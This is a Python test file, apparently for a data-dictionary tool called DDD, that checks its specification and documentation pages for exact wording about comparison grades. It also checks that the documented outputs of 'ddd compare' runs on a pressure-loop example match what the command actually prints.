    def test_the_specification_and_the_comparison_page_say_the_floor_is_the_same_for_all_three(
        self,
    ) -> None:
        for name, text, tick in (
            ("SPEC.md", SPEC, "`"),
            ("docs/comparing_deliveries.rst", COMPARING_DELIVERIES, "``"),
        ):
            flat = flattened(text)
            assert f"the Compare tab of {tick}ddd gui{tick} take it from the file" in flat, name
            assert "whether or not the run said so" in flat, name
        assert "because a component given as the baseline is read one way by every caller" in (
            flattened(SPEC)
        )
        assert (
            "so that an input of the component nobody was shown the producer of is not an error "
            "of the baseline"
        ) in flattened(COMPARING_DELIVERIES)


class TestAnOutputOfAComponentReadAloneIsGradedAsRead:
    """Who reads an output of a component read alone is what the run was not shown, so every
    grade that waits on a reader takes it as read, as its removal does: a rename, a condition
    added or replaced, ``volatile`` turned on and a measurement's limits. Each home of those
    grades says so, and the ids that stand for an object nobody reads say where the output went."""

    TABLES: ClassVar[dict[str, str]] = {
        "README.md": README,
        "docs/consistency_checks.rst": CONSISTENCY_CHECKS,
        "docs/comparing_deliveries.rst": COMPARING_DELIVERIES,
    }

    def test_the_registry_takes_it_as_read_for_each_grade(self) -> None:
        for check, said in (
            (
                "renamed-read-object",
                "an object of the baseline that somebody read, or an output of a component read "
                "alone, is offered under a different name",
            ),
            (
                "narrowed-condition",
                "the preprocessor condition of an object somebody reads, or of any output of a "
                "component read alone, was added or replaced",
            ),
            (
                "widened-limits",
                "the physical limits of a measurement somebody reads, or of an output measurement "
                "of a component read alone, got wider",
            ),
            (
                "narrowed-read-limits",
                "the physical limits of a measurement somebody reads, or of an output measurement "
                "of a component read alone, got tighter",
            ),
            (
                "changed-interface",
                "or volatile turned on for an object a component reads or an output of a component "
                "read alone",
            ),
            (
                "changed-storage",
                "volatile turned on for an object a component reads or an output of a component "
                "read alone is changed-interface instead",
            ),
            (
                "narrowed-limits",
                "a measurement somebody reads, or an output measurement of a component read "
                "alone, is widened-limits or narrowed-read-limits instead",
            ),
            (
                "changed-condition",
                "one added or replaced on an object somebody reads, or on an output of a component "
                "read alone, is narrowed-condition instead",
            ),
            (
                "renamed-object",
                "no component read it, and it is not an output of a component read alone",
            ),
        ):
            assert said in CHECKS[check].description, check

    def test_no_home_calls_a_local_object_one_a_component_read_alone_produces(self) -> None:
        """A ``local`` object is produced by its owner too, and keeps the grades of an object
        nobody reads, so the grades that take an output as read say an output of such a
        component, which a local object is not, and never one that it produces."""
        homes = {
            "README.md": README,
            "docs/consistency_checks.rst": CONSISTENCY_CHECKS,
            "docs/comparing_deliveries.rst": COMPARING_DELIVERIES,
            "SPEC.md": SPEC,
            "the registry": "\n".join(check.description for check in CHECKS.values()),
        }
        for name, text in homes.items():
            flat = flattened(text)
            assert "read alone produce" not in flat, name
            assert "an output of a component read alone" in flat, name

    def test_each_table_takes_it_as_read_for_each_grade(self) -> None:
        for name, text in self.TABLES.items():
            flat = flattened(text)
            for said in (
                "that a component read, or an output of a component read alone, is offered under a "
                "different name",
                "the preprocessor condition of an object a component reads, or of any output of a "
                "component read alone, was added or replaced",
                "a measurement a component reads, or of an output measurement of a component read "
                "alone, got wider",
                "a measurement a component reads, or of an output measurement of a component read "
                "alone, got tighter",
                "one added or replaced on an object a component reads, or on an output of a "
                "component read alone, is",
            ):
                assert said in flat, (name, said)
        for name in ("README.md", "docs/comparing_deliveries.rst"):
            flat = flattened(self.TABLES[name])
            assert (
                "volatile turned on for an object a component reads or an output of a component "
                "read alone is changed-interface instead"
            ) in flat, name
            assert (
                "on a measurement a component reads, or on an output measurement of a component "
                "read alone, it is"
            ) in flat, name
        reference = flattened(CONSISTENCY_CHECKS)
        assert "and every grade that waits on a reader takes such an output as read" in reference

    def test_the_specification_takes_it_as_read_for_each_grade(self) -> None:
        spec = flattened(SPEC)
        for said in (
            "An output of it is therefore taken as read by every grade that waits on a reader, "
            "with a message that does not claim to know who read it",
            "gone it is `removed-object`, renamed `renamed-read-object`, given a condition or "
            "another one `narrowed-condition`, turned `volatile` `changed-interface`, and the "
            "limits of a measurement widened are `widened-limits` and narrowed "
            "`narrowed-read-limits`",
            "any other change of an input is graded as one of an object its component reads",
            "as it keeps every grade of an object nobody reads",
            "is a change of interface for an object a component reads or an output of a component "
            "read alone",
            "`renamed-read-object`: an object of the baseline that a component read, or an output "
            "of a component read alone, is offered under a different name",
            "and reported with the readers named, or said not to be known where it is an output "
            "of a component read alone",
            "a condition added to an object a component reads or an output of a component read "
            "alone, or one replaced by another",
            "and it names the readers, or says they are not known",
            "`widened-limits`: the physical limits of a measurement somebody reads, or of an "
            "output measurement of a component read alone, got wider",
            "`narrowed-read-limits`: the physical limits of a measurement somebody reads, or of "
            "an output measurement of a component read alone, got tighter",
            "and `narrowed-condition` where a component reads it or it is an output of a "
            "component read alone",
        ):
            assert said in spec, said

    def test_the_comparison_page_says_what_a_supplier_gate_grades_as_read(self) -> None:
        page = flattened(COMPARING_DELIVERIES)
        for said in (
            "So a supplier's gate grades an output by what one file can know: it is taken as read "
            "by every grade that waits on a reader, with a message that does not claim to know "
            "who read it",
            "renamed, it is ``renamed-read-object``, given a condition or another one "
            "``narrowed-condition``, and turned ``volatile`` ``changed-interface``, each an error",
            "and the limits of a measurement it widens are ``widened-limits`` and those it narrows "
            "``narrowed-read-limits``",
            "and every other grade of an object nobody reads",
        ):
            assert said in page, said
        assert "So a supplier's gate grades a removal by what one file can know" not in page


class TestOneVerdictOnOnePairWhoeverAsks:
    """``ddd compare``, ``ddd check --baseline`` and the Compare tab ask one function, and the
    tab counts the open project's own errors in its verdict as the commands do."""

    def test_the_specification_says_the_three_give_one_pair_one_verdict(self) -> None:
        flat = flattened(SPEC)
        assert (
            "`ddd compare`, `ddd check --baseline` and the Compare tab of `ddd gui` give one "
            "pair one verdict, since they ask one function"
        ) in flat
        assert "the tab counts the open project's own errors in it as the commands do" in flat
        assert "and says how many the project has of its own" in flat

    def test_the_comparison_page_says_the_same(self) -> None:
        flat = flattened(COMPARING_DELIVERIES)
        assert "One pair gets one verdict, whoever asks." in flat
        assert (
            "whether it is the candidate's own, one carried over from the baseline, or the "
            "comparison's"
        ) in flat
        assert "and its answer says how many the project has of its own" in flat

    def test_the_command_line_page_no_longer_keeps_the_projects_errors_out_of_the_tab(
        self,
    ) -> None:
        flat = flattened(COMMAND_LINE_INTERFACE)
        assert "Its verdict is the one ``ddd compare`` exits on" in flat
        assert "the project's own errors count in it" in flat
        assert "the answer says how many errors the project has of its own" in flat
        assert "take no part in it" not in flat

    def test_the_command_line_page_does_not_promise_a_supplier_more_than_the_gate_holds(
        self,
    ) -> None:
        flat = flattened(COMMAND_LINE_INTERFACE)
        assert (
            "an output a component drops, renames, puts under a new condition or turns "
            "``volatile`` fails that gate, whoever reads it"
        ) in flat
        assert "and the limits of a measurement it widens are warned of" in flat
        assert "and one whose limits it widens is warned of" not in flat
        assert "an input it stops reading does not" in flat


class TestLimitsAreGradedByTheDirectionDataFlows:
    """A measurement's limits are what the producer states for its readers, so on one somebody
    reads it is the widening that can break them. ``widened-limits`` is the warning,
    ``narrowed-read-limits`` the information, and calibration data keeps its grades."""

    HOMES: ClassVar[dict[str, str]] = {
        "README.md": README,
        "docs/consistency_checks.rst": CONSISTENCY_CHECKS,
        "docs/comparing_deliveries.rst": COMPARING_DELIVERIES,
        "SPEC.md": SPEC,
    }

    def test_the_registry_grades_each_id_once(self) -> None:
        assert CHECKS["widened-limits"].default_severity is Severity.WARNING
        assert CHECKS["narrowed-read-limits"].default_severity is Severity.INFO
        assert CHECKS["narrowed-limits"].default_severity is Severity.WARNING
        for name in ("widened-limits", "narrowed-read-limits"):
            assert CHECKS[name].comparison
        assert CHECKS["narrowed-limits"].description.endswith(
            "widened-limits or narrowed-read-limits instead"
        )

    def test_every_page_lists_both_ids(self) -> None:
        for name, text in self.HOMES.items():
            for check in ("widened-limits", "narrowed-read-limits"):
                assert check in flattened(text), (name, check)

    def test_the_specification_grades_limits_by_the_direction_the_data_flows(self) -> None:
        flat = flattened(SPEC)
        assert "Limits **shall** be graded by the direction the data flows" in flat
        assert "so widening them **shall** be `widened-limits`, a warning" in flat
        assert "narrowing them **shall** be `narrowed-read-limits`, an information" in flat
        assert "A range that moved both ways is a widening." in flat
        assert "A measurement nobody reads has no reader to promise anything to" in flat
        assert "so widening its limits **shall** be silent" in flat
        assert "Widening a limit **shall** be silent" not in flat

    def test_the_comparison_page_says_a_widened_measurement_is_what_a_reader_can_trip_over(
        self,
    ) -> None:
        flat = flattened(COMPARING_DELIVERIES)
        assert "A measurement somebody reads is the other way round." in flat
        assert "Widening them is therefore ``widened-limits``, a warning" in flat
        assert "Narrowing them is ``narrowed-read-limits``, an information" in flat
        assert 'turns into "cannot replace"' in flat
        assert "there is nothing a calibration dataset can trip over" in flat
        assert "nothing a consumer or a calibration dataset can trip over" not in flat

    def test_the_check_reference_says_where_the_silence_holds(self) -> None:
        flat = flattened(CONSISTENCY_CHECKS)
        assert "this is the grade of calibration data and of a measurement nobody reads" in flat

    def test_the_check_reference_tells_a_project_that_relaxed_narrowed_limits_what_to_relax(
        self,
    ) -> None:
        flat = flattened(CONSISTENCY_CHECKS)
        assert (
            "A project that relaxed ``narrowed-limits`` for a measurement a component reads "
            "relaxes ``narrowed-read-limits`` and ``widened-limits`` instead"
        ) in flat

    def test_the_readme_and_the_faq_say_the_direction_depends_on_the_flow(self) -> None:
        assert "**A limit is graded by the direction the data flows.**" in flattened(README)
        assert "widening it is a warning while narrowing it is an information" in flattened(README)
        faq = flattened(PAGES["docs/faq.rst"])
        assert "``widened-limits`` is a warning on a measurement a component reads" in faq
        assert "the other way round for a measurement a component reads" in faq

    # The blocks of the comparison page that show a run of ``examples/pressure``, each with
    # the edit of the working tree that block says it ran on (``None``: the tree as shipped).
    # A block is held to its own run as a whole - findings, summary and verdict - and not to
    # a line that is somewhere on the page, because the same finding is shown in several.
    RUNS: ClassVar[dict[str, str | None]] = {
        "ddd check examples/pressure/release/pressure.ddd.json": None,
        "ddd check examples/pressure/work/pressure.ddd.json": None,
        "ddd compare examples/pressure/release/PressureLoop-1.4.0.json "
        "examples/pressure/work/pressure.ddd.json": None,
        "ddd compare examples/pressure/release/PressureLoop-1.4.0.json "
        "examples/pressure/work/pressure.ddd.json  # the candidate without FilterGain": "no-gain",
        "ddd check examples/pressure/work/pressure.ddd.json "
        "--baseline examples/pressure/release/PressureLoop-1.4.0.json  "
        "# the candidate also reading ValvePosition": "position",
        "ddd compare examples/pressure/release/PressureLoop-1.4.0.json "
        "examples/pressure/work/pressure.ddd.json  "
        "# FilterGain's limits narrowed to 0 .. 0.5 instead": "gain-limits",
        "ddd check examples/pressure/work/pressure.ddd.json  "
        "# PressureRaw rescaled to a factor of 0.01 instead": "rescaled",
        "ddd compare examples/pressure/release/PressureLoop-1.4.0.json "
        "examples/pressure/work/pressure.ddd.json  "
        "# PressureRaw rescaled to a factor of 0.01 instead": "rescaled",
        "ddd compare examples/pressure/release/PressureLoop-1.4.0.json "
        "examples/pressure/work/pressure.ddd.json  # the candidate renamed AirLoop": "airloop",
        "ddd compare examples/pressure/release/PressureLoop-1.4.0.json "
        "examples/pressure/work/pressure.ddd.json -W widened-limits=ignore "
        "-W narrowed-read-limits=ignore -W added-object=ignore": None,
    }

    @staticmethod
    def edit_component(tree: Path, name: str, change: Any) -> None:
        path = tree / "examples" / "pressure" / "work" / "components" / f"{name}.ddd.json"
        data = json.loads(path.read_text(encoding="utf-8"))
        change(data["component"]["interface"])
        path.write_text(json.dumps(data, indent=2), encoding="utf-8")

    def tree_for(self, tmp_path: Path, scenario: str | None) -> None:
        """Copy the example, dump the release as the page does, then apply the scenario."""
        shutil.copytree(ROOT / "examples" / "pressure", tmp_path / "examples" / "pressure")
        release = tmp_path / "examples" / "pressure" / "release"
        work = tmp_path / "examples" / "pressure" / "work"
        assert (
            main(
                [
                    "dump",
                    str(release / "pressure.ddd.json"),
                    "-o",
                    str(release / "PressureLoop-1.4.0.json"),
                ]
            )
            == EXIT_OK
        )
        if scenario is None:
            return
        # Every other scenario is the release with one edit, as the page's "suppose" says.
        if scenario not in ("position", "airloop"):
            shutil.rmtree(work)
            shutil.copytree(release, work, ignore=shutil.ignore_patterns("PressureLoop-1.4.0.json"))

        def named(interface: list[dict[str, Any]], name: str) -> dict[str, Any]:
            return next(e["definition"] for e in interface if e["definition"]["name"] == name)

        def rescale(interface: list[dict[str, Any]]) -> None:
            for entry in interface:
                if entry["definition"]["name"] == "PressureRaw":
                    entry["definition"]["conversion"] = {"factor": 0.01}
                    entry["definition"]["limits"] = {"min": 0, "max": 250}

        if scenario == "no-gain":
            self.edit_component(
                tmp_path,
                "sensor",
                lambda i: i.remove(next(e for e in i if e["definition"]["name"] == "FilterGain")),
            )
        elif scenario == "gain-limits":
            self.edit_component(
                tmp_path, "sensor", lambda i: named(i, "FilterGain")["limits"].update(max=0.5)
            )
        elif scenario == "rescaled":
            for component in ("sensor", "controller"):
                self.edit_component(tmp_path, component, rescale)
        elif scenario == "airloop":
            path = work / "pressure.ddd.json"
            path.write_text(
                path.read_text(encoding="utf-8").replace("PressureLoop", "AirLoop"),
                encoding="utf-8",
            )
        else:
            assert scenario == "position"
            self.edit_component(
                tmp_path,
                "actuator",
                lambda i: i.append(
                    {
                        "scope": "input",
                        "definition": {**dict(named(i, "SupplyVoltage")), "name": "ValvePosition"},
                    }
                ),
            )

    def test_every_block_of_the_comparison_page_that_shows_a_run_is_what_the_command_prints(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        """Each block, as a whole: the findings, the summary line and the verdict line."""
        blocks: dict[str, list[str]] = {}
        lines = COMPARING_DELIVERIES.splitlines()
        for number, line in enumerate(lines):
            if not line.startswith("   $ ddd ") or " > " in line:
                continue
            shown: list[str] = []
            for following in lines[number + 1 :]:
                if not following.startswith("   ") or following.startswith("   $ "):
                    break
                shown.append(following[3:])
            blocks.setdefault(line[5:], []).append("\n".join(shown))
        held = 0
        for command, scenario in self.RUNS.items():
            assert command in blocks, command
            shutil.rmtree(tmp_path / "examples", ignore_errors=True)
            self.tree_for(tmp_path, scenario)
            monkeypatch.chdir(tmp_path)
            capsys.readouterr()
            main(shlex.split(command.split("  #")[0])[1:])
            captured = capsys.readouterr()
            printed = (captured.out + captured.err).rstrip("\n")
            for shown_text in blocks[command]:
                assert printed == shown_text, command
                held += 1
        assert held == 10
        assert "Five findings for five changes." in flattened(COMPARING_DELIVERIES)


class TestWhatThePagesSayOfTheNineSmallerVerdicts:
    """Each sentence the pages gained for the nine findings of the branch's last task, held where
    it is said: the grade of ``missing-producer`` in a dump, what reaches a baseline and what
    does not, what a file must state to be a delivery, and the order a member's change is told."""

    DICTIONARY = PAGES["docs/data_dictionary.rst"]

    def test_a_shape_is_told_with_the_sizes_its_constants_give(self) -> None:
        assert (
            "that shape is told with the size each constant gives, `[N=8] != [N=4]`"
        ) in flattened(SPEC)
        assert (
            "A dimension a constant names is told with the size the constant gives, "
            "``[N=8] != [N=4]``"
        ) in flattened(COMPARING_DELIVERIES)

    def test_an_object_that_lost_its_producer_is_missing_producer_and_said_once(self) -> None:
        spec = flattened(SPEC)
        assert (
            "- `missing-producer`: an object or a structured variable had a producer in the "
            "baseline, and the candidate, given as a dumped dictionary, has a component that "
            "still reads it and none that produces it"
        ) in spec
        assert "with its one severity and under the run's own `-W`" in spec
        assert "and it is said in place of that pair's `changed-owner`, being the one fact" in spec
        assert "An object with no producer on both sides is no change the comparison makes" in spec
        assert "a dictionary carries no mark of which a dump is" in spec
        assert "An input that arrived with no producer is `added-object` alone" in spec
        assert (
            "A candidate given as a description has it said by its analysis, and `changed-owner` "
            "is not said beside it there either"
        ) in spec
        assert "which a delivery comparison says as `missing-producer` of a candidate whose" in spec
        pages = flattened(COMPARING_DELIVERIES)
        assert (
            "an object that lost its producer while a component still reads it is "
            "``missing-producer``, an error, as ``ddd check`` says of the same description"
        ) in pages
        assert "said in place of that pair's ``changed-owner``, being the one fact" in pages
        assert "``-W missing-producer=ignore`` relaxes it as it relaxes the check" in pages
        assert "An object with no producer on both sides is no change the comparison makes" in pages
        assert "two dumps of one component read alone hold its inputs so" in pages
        assert "an input that arrived with no producer is an ``added-object`` and no more" in pages
        assert "has it said by its analysis, with no ``changed-owner`` beside it" in pages
        assert "lost the producer of while a component still reads it" in flattened(
            CONSISTENCY_CHECKS
        )
        assert "``ddd compare`` says ``missing-producer`` of such an object" in flattened(
            self.DICTIONARY
        )
        assert "in a candidate dump when the baseline had a producer for it" in flattened(
            self.DICTIONARY
        )

    def test_the_floor_does_not_reach_a_producer_the_baseline_had(self) -> None:
        spec = flattened(SPEC)
        assert (
            "The one exception is the floor of `ddd check --standalone`, which silences that "
            "analysis for what a component read alone was never shown and does not reach a "
            "producer the baseline had"
        ) in spec
        assert ("the comparison then says it, once, as an error whatever the floor says") in spec
        assert "and a project's own `-W missing-producer=ignore` still silences it" in spec
        assert (
            "and what fails the gate for a component that turns an output into an input"
        ) in spec
        assert "the gate's own for a component that drops an output" not in spec
        pages = flattened(COMPARING_DELIVERIES)
        assert (
            "The one exception is the floor of ``ddd check --standalone``, which silences that "
            "analysis for what a component read alone was never shown and does not reach a "
            "producer the baseline had"
        ) in pages
        assert "the comparison then says it, once, as an error whatever the floor says" in pages
        assert "what makes a component that turns an output into an input fail that gate" in pages
        assert "what makes a component that drops an output fail that gate" not in pages
        assert "and a project's own ``-W missing-producer=ignore`` still silences it" in pages

    def test_the_check_reference_says_the_floor_does_not_reach_a_producer_the_baseline_had(
        self,
    ) -> None:
        """The row of ``missing-producer`` names both candidates the comparison says it of, and
        the paragraph on ``--standalone`` no longer says the option touches nothing else."""
        reference = flattened(CONSISTENCY_CHECKS)
        assert (
            "and so does ``ddd check --baseline --standalone`` of an output the component turned "
            "into an input, as an error whatever the floor says, since the floor does not reach "
            "a producer the baseline had; a project's own ``-W missing-producer=ignore`` still "
            "silences it"
        ) in reference
        assert (
            "and touches nothing else of the analysis, so everything DDD can decide from the file "
            "in front of it is still reported"
        ) in reference
        assert (
            "Beside ``--baseline``, a producer the candidate lost is said by the comparison "
            "instead, as an error the floor does not reach (``missing-producer`` below)."
        ) in reference
        assert "and touches nothing else, so" not in reference

    def test_a_broken_baseline_withholds_nothing_of_the_candidates(self) -> None:
        spec = flattened(SPEC)
        assert "and its renames are written, whatever errors the baseline carries" in spec
        assert "a broken baseline withholds nothing of the candidate's" in spec
        assert (
            "and one that could not be read at all, which leaves nothing to compare, still lets "
            "the candidate's findings be reported"
        ) in spec
        assert (
            "When the baseline carries an error, the comparison is made and the verdict is a "
            "refusal; when a side cannot be read, no verdict is printed"
        ) in spec
        pages = flattened(COMPARING_DELIVERIES)
        assert "a broken baseline withholds nothing of the candidate's" in pages
        assert (
            "A baseline that cannot be read at all is a different matter: there is nothing to "
            "compare, so no verdict is printed, and what the candidate has of its own is "
            "reported all the same"
        ) in pages
        assert (
            "has no dictionary to compare with: no verdict is printed and no renames file is "
            "written, while the candidate's own findings are still reported"
        ) in pages
        assert "the comparison is made, the errors are reported beside it and the verdict" in pages
        assert "under the project's own policy" in pages

    def test_a_relaxation_reaches_a_description_baseline_and_a_promotion_does_not(self) -> None:
        spec = flattened(SPEC)
        assert "under neither `--strict` nor the promotions of the `-W` of this run" in spec
        assert (
            "What does reach it is the relaxations of the project's `-W`, an override grading a "
            "check below the grade it has by default"
        ) in spec
        assert (
            "a plugin's check, whose grade is not known until its plugin is loaded, only as "
            "`ignore`"
        ) in spec
        assert "a project that builds with `-W missing-producer=ignore` can compare its branch" in (
            spec
        )
        assert (
            "The Compare tab reads it under the relaxations that every build record of the "
            "project makes"
        ) in spec
        pages = flattened(COMPARING_DELIVERIES)
        assert "This run's ``-W`` reaches it in one direction only. A promotion does not" in pages
        assert "``--strict`` does not reach it either" in pages
        assert "A relaxation does: ``-W missing-producer=ignore`` is a project deciding" in pages
        assert "Only a lower grade than the check has by default is a relaxation" in pages
        assert "a check one of them does not relax is not relaxed" in pages
        assert ("so a ``-W`` of it reaches the baseline as ``ignore`` alone") in pages
        assert (
            "A promotion of this run does not make one of them an error, and a ``-W`` that "
            "relaxes the check relaxes it"
        ) in pages
        assert "The relaxations of that policy reach a baseline given as a project" in flattened(
            CONSISTENCY_CHECKS
        )

    def test_the_pages_say_per_side_what_ddd_compare_does_with_a_component_file(self) -> None:
        spec = flattened(SPEC)
        assert (
            "`ddd compare` has no `--standalone` of its own: a component file given as the "
            "baseline is read under that floor, as above, and one given as the candidate is read "
            "as a project's file is, an input nobody in it produces being its own error"
        ) in spec
        assert (
            "Two versions of a component with inputs are therefore compared with "
            "`ddd check --baseline --standalone`, the command that takes the option"
        ) in spec
        pages = flattened(COMPARING_DELIVERIES)
        assert (
            "``ddd compare`` has no ``--standalone``. It reads a component file given as the "
            "baseline under the floor"
        ) in pages
        assert (
            "a component file given as the candidate it reads as a project's file is read, so "
            "that an input nobody in the file produces is an error of the candidate"
        ) in pages
        assert (
            "A supplier comparing two versions of a component with inputs therefore uses "
            "``ddd check --baseline --standalone``, the command that takes the option"
        ) in pages

    def test_null_against_explicit_zeros_is_no_change(self) -> None:
        assert (
            'An object stating no `init` stores zeros, so adding `0`, `[0, 0]` or `""` to one '
            "that had none moves no byte and is no change, in either direction"
        ) in flattened(SPEC)
        assert (
            "An object stating no initial value stores zeros, so adding ``0``, ``[0, 0]`` or "
            '``""`` to one that had none moves no byte and is no change, in either direction'
        ) in flattened(COMPARING_DELIVERIES)

    def test_a_json_holding_only_a_name_is_no_delivery(self) -> None:
        spec = flattened(SPEC)
        assert "is no delivery, and is refused on either side in those words" in spec
        assert "a file stating neither it, nor `project`, nor `component`" in spec
        assert "is no delivery and is refused as such" in flattened(self.DICTIONARY)
        assert "is no delivery, and is refused on either side in those words" in flattened(
            COMPARING_DELIVERIES
        )

    def test_a_members_change_is_told_per_path_in_numeric_order(self) -> None:
        assert (
            "A member's own change is told at every path that reaches it, and the paths are in "
            "the order `ddd list` gives them, an index counted as a number"
        ) in flattened(SPEC)
        assert "sorted by `to` with an index counted as a number" in flattened(SPEC)
        assert "A member's own change is reported at every path that reaches it" in flattened(
            COMPARING_DELIVERIES
        )
        assert "``[2]`` before ``[10]``, as are the removals, the additions and the entries" in (
            flattened(COMPARING_DELIVERIES)
        )


def test_the_command_line_page_says_which_hosts_ddd_gui_takes() -> None:
    """``ddd gui --host`` takes ``127.0.0.1``, ``0.0.0.0`` or a name resolving to either, and
    refuses any other (12:M5, 9:M8), as its ``--help`` says (``tests/test_gui_server.py``)."""
    flat = flattened(COMMAND_LINE_INTERFACE)
    assert "``--host 0.0.0.0`` listens beyond this computer for a container" in flat
    assert (
        "``--host`` takes that address, the default ``127.0.0.1`` or a name resolving to either, "
        "and refuses any other." in flat
    )
